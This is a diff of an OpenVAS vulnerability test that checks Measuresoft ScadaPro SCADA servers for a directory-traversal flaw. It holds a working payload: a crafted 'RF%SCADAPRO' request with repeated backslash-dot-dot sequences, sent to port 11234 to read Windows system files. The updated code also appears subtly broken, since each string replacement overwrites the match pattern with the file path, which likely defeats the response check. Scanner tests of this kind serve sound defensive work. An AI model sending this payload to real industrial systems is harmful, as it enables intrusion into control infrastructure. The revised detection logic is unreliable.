@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_measuresoft_scadapro_mult_vuln.nasl 11421 2018-09-17 06:58:23Z cfischer $
+# $Id: gb_measuresoft_scadapro_mult_vuln.nasl 12092 2018-10-25 11:43:33Z cfischer $
 #
 # Measuresoft ScadaPro Multiple Security Vulnerabilities
 #
@@ -27,12 +27,12 @@
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.802047");
-  script_version("$Revision: 11421 $");
+  script_version("$Revision: 12092 $");
   script_bugtraq_id(49613);
   script_cve_id("CVE-2011-3495", "CVE-2011-3496", "CVE-2011-3497", "CVE-2011-3490");
   script_tag(name:"cvss_base", value:"10.0");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
-  script_tag(name:"last_modification", value:"$Date: 2018-09-17 08:58:23 +0200 (Mon, 17 Sep 2018) $");
+  script_tag(name:"last_modification", value:"$Date: 2018-10-25 13:43:33 +0200 (Thu, 25 Oct 2018) $");
   script_tag(name:"creation_date", value:"2012-12-19 15:53:58 +0530 (Wed, 19 Dec 2012)");
   script_name("Measuresoft ScadaPro Multiple Security Vulnerabilities");
   script_category(ACT_ATTACK);
@@ -48,6 +48,7 @@ if(description)
   script_xref(name:"URL", value:"http://www.us-cert.gov/control_systems/pdf/ICSA-11-263-01.pdf");
   script_xref(name:"URL", value:"http://www.us-cert.gov/control_systems/pdf/ICS-ALERT-11-256-04.pdf");
   script_xref(name:"URL", value:"http://www.measuresoft.net/news/post/Reports-of-Measuresoft-ScadaPro-400-Vulnerability-when-Windows-Firewall-is-switched-Off.aspx");
+  script_xref(name:"URL", value:"http://www.measuresoft.com/products/scadapro-server/scada-server.aspx");
 
   script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to read, modify, or
   delete arbitrary files and possibly execute arbitrary code.");
@@ -55,8 +56,8 @@ if(description)
   script_tag(name:"affected", value:"Measuresoft ScadaPro 4.0.0 and prior");
 
   script_tag(name:"insight", value:"Multiple boundary errors within service.exe when processing certain packets.");
-  script_tag(name:"solution", value:"Upgrade to Measuresoft ScadaPro 4.0.1 or later,
-  http://www.measuresoft.com/products/scadapro-server/scada-server.aspx");
+
+  script_tag(name:"solution", value:"Upgrade to Measuresoft ScadaPro 4.0.1 or later.");
 
   script_tag(name:"summary", value:"The host is running Measuresoft ScadaPro SCADA Server and is prone
   to multiple vulnerabilities.");
@@ -68,37 +69,43 @@ if(description)
 }
 
 include("host_details.inc");
+include("misc_func.inc");
 
-scada_port = 11234;
-if(!get_port_state(scada_port))exit(0);
-soc = open_sock_tcp(scada_port);
-if(!soc){
-  exit(0);
-}
+port = 11234;
+if( ! get_port_state( port ) )
+  exit( 0 );
 
-# Directory traversal string
-trav_str = crap(length:19, data:'\x5c\x2e\x2e');
+soc = open_sock_tcp( port );
+if( ! soc )
+  exit( 0 );
 
-# nb: did not use traversal_files() because egrep is not matching the response
-# due to non printable characters in the response
-files = make_list("windows/win.ini", "boot.ini", "winnt/win.ini");
+trav_str = crap( length:19, data:'\x5c\x2e\x2e' );
 
-foreach file (files)
-{
-  read_req = string('RF%SCADAPRO', trav_str, file,
-             '\x09\x32\x35\x36\x09\x2d\x31\x09\x30\x09\x32\x36\x38\x34\x33',
-             '\x35\x34\x35\x36\x09\x33\x09\x30\x09\x34\x09\x30\x09\x30\x00');
+files = traversal_files( "Windows" );
 
-  send(socket:soc, data:read_req);
+foreach pattern( keys( files ) ) {
 
-  file_info = recv(socket:soc, length:2048, timeout:20);
+  file = files[pattern];
 
-  if("; for 16-bit app support" >< file_info || "[boot loader]" >< file_info)
-  {
-    security_message(port:scada_port);
-    close(soc);
-    exit(0);
+  # nb: Workaround as egrep is not matching the response due to non printable characters in the response
+  pattern = str_replace( find:"\[", string:file, replace:"[" );
+  pattern = str_replace( find:"\]", string:file, replace:"]" );
+  pattern = str_replace( find:"supporT", string:file, replace:"support" );
+
+  req = string( 'RF%SCADAPRO', trav_str, file,
+                '\x09\x32\x35\x36\x09\x2d\x31\x09\x30\x09\x32\x36\x38\x34\x33',
+                '\x35\x34\x35\x36\x09\x33\x09\x30\x09\x34\x09\x30\x09\x30\x00' );
+
+  send( socket:soc, data:req );
+
+  res = recv( socket:soc, length:2048, timeout:20 );
+
+  if( pattern >< res ) {
+    close( soc );
+    security_message( port:port );
+    exit( 0 );
   }
 }
 
-close(soc);
+close( soc );
+exit( 0 );
